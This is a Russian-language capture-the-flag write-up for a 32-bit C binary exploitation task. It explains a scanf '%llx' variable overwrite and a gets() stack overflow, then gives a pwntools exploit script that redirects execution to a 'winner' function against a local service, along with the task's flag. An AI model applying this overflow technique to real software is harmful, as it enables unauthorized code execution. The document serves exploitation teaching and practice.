# buf buf buf

***Описание***: Засплойти его, братишка, хо-хо, засплойти!

Подключение: `nc localhost:10664`

---
### Решение - Этап 1. Анализ уязвимостей

Таск включает уязвимый сервер на языке C, скомпилированный с опциями `-m32 -fno-stack-protector -no-pie -g`, что делает его уязвимым к атакам переполнения буфера и неправильной обработки входных данных. Программа предлагает несколько функций, включая сохранение данных, печать данных, выход и логин. Уязвимости в `scanf("%llx", &choice)` и `gets(buff)` позволяют манипулировать памятью и потоком исполнения программы.

Уязвимость в `scanf` использует формат `%llx`, что позволяет ввести 64-битные данные в 32-битную переменную `choice`, потенциально переписывая соседние переменные в стеке. Это дает возможность изменить переменную `user_login`, что необходимо для доступа к функции сохранения данных.

Уязвимость в `gets` не ограничивает количество вводимых данных, позволяя переписать содержимое стека за пределами выделенного буфера, что может привести к перезаписи адреса возврата и изменению потока исполнения программы.

### Решение - Этап 2. Эксплуатация уязвимостей

Сначала используем уязвимость в `scanf`, чтобы установить `user_login` на значение 67 
(`0x43`). Это позволяет выполнить команду сохранения данных, предоставляя доступ к `gets`.

Затем отправляем данные через `gets`, которые переполняют буфер `buff` и переписывают адрес возврата на адрес функции `winner`, вызывая её выполнение и получение флага.

Инструменты:
- Использование `netcat` для взаимодействия с сервером.
- Скрипт на Python для автоматизации отправки специально сформированных данных.

### Решение - Этап 3. Создание эксплойта

Подготовка данных для `scanf` и `gets`.
Тестирование локально и в среде, аналогичной условиям соревнования.

Сам эксплойт (возможны неточности в адресации): 

```python
from pwn import *

# Настройка параметров подключения
host = 'localhost'
port = 10664

# Создаем соединение
conn = remote(host, port)

# Подключаемся и ждем приглашения ввести команду
prompt = conn.recvuntil(b'command: ')

# Отправляем модифицированное значение для 'choice', чтобы установить 'user_login' в 67
conn.sendline(b'0000004300000001')  # Hex значение для изменения user_login на 67 и choice на 1

# Ожидаем следующее приглашение к вводу данных
save_data_prompt = conn.recvuntil(b'Hello. Please write save \n data: ')

# Подготавливаем payload для переполнения буфера и вызова функции winner
payload = b'A' * 256 + b'A' *12   + p32(0x80491c6)	# Может изменяться

# Отправляем payload
conn.sendline(payload)

# Получаем ответ сервера
response = conn.recvall()
print("Ответ сервера: ", response.decode())

# Закрываем соединение
conn.close()
```

После успешной эксплуатации всех уязвимостей сервер выводит флаг. Этот флаг подтверждает успешное выполнение эксплойта и правильное использование найденных уязвимостей для манипуляции поведением программы.

---

***Флаг***: `EclipseCTF{V3ry_go0deST_7ask1_1n_PW#$}`
